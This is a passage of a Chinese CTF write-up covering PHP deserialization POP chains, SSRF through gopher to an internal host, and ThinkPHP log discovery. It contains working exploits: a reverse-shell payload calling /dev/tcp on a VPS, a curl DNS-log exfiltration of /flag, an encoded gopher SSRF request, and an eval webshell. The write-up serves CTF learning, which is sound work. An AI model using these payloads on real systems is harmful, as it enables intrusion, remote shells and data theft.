keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span> <span class="token operator">=</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token operator">===</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token operator">&amp;&amp;</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token operator">===</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">right</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is your flag "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"one more step"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"don't give up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Not a valid token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"give me the token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>主要是最后一关<br>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">last_task</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$left</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$middle</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$right</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">last_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">right</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p><h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_AFKL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"关注嘉然,"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_JiaRan</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p><p>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//$this.value=new b();</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"关注嘉然,"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Do_u_like_JiaRan</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'bash -c "bash -i >&amp; /dev/tcp/[vps-ip]/9999 0>&amp;1"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span></span></code></pre><p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p><p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p><p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p><h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><span class="token delimiter important">?></span></span></code></pre><p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36name=admin&amp;password=123456&amp;result=60</code></pre><p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p><p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p><p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p><h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png"></p><p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p><p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png"><br>在第一个日志中有写好的一句话</p><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);phpinfo(); ?&gt;</code></pre><p>然后通过shell读取flag</p><h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$call</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can't do this :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$call</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$call</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">b</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token keyword">extends</span> <span class="token class-name">b</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$call</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setB</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setB</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>执行流程：</p><pre><code>class a的test=new c(),调用c的test(),c继承于b,会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],$this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)就变成了([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;]);第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];$call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)第二次进入d中,d的$this-&gt;value=whoami,$call=system,$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre><p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">aa</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$dd</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//输出 123      ["aa","fun"]()这样也可以</span></code></pre><p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p><p>看一个简单的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">aa</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$qq</span><span class="token 